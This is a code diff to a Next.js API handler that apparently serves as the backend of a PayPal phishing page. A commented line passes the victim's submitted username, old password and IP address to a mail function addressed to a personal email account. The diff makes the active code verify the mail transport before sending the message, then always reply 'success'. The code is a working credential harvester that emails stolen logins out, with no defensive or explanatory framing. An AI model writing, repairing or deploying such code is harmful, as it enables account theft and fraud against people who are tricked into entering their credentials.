@@ -9,10 +9,6 @@ type Data = {
     ip: string
 }
 
-async function  sendEmail(from: string, to: string, source: string, username: string, pass: string, ip: string) {
-  
-}
-
 export default async function handler(req: NextApiRequest, res: NextApiResponse<string>/*NextApiResponse<Data>*/) {
     const body = req.body
     //await sendEmail('support@greeniumtrade.com', 'campdaniel06@gmail.com', 'paypal', body.username, body.oldPassword, body.ip)
@@ -25,27 +21,21 @@ export default async function handler(req: NextApiRequest, res: NextApiResponse<
 
     const transport = await createNodeMailerTransport()
 
-    transport.sendMail(mailDetails, (err, data) => {
-        if(err) {
-            console.log(err);
+    console.log(transport);
+    
+    transport.verify((error, success) => {
+        if(error){
+            console.log(error)
         } else {
-            console.log(data);
+            transport.sendMail(mailDetails, (err, data) => {
+                if(err) {
+                    console.log(err);
+                } else {
+                    console.log(data);
+                }
+            });
         }
     })
-
-    // transport.verify((error, success) => {
-    //     if(error){
-    //         console.log(error)
-    //     } else {
-    //         transport.sendMail(mailDetails, (err, data) => {
-    //             if(err) {
-    //                 console.log(err);
-    //             } else {
-    //                 console.log(data);
-    //             }
-    //         });
-    //     }
-    // })
 
     res.status(200).json('success')
 }
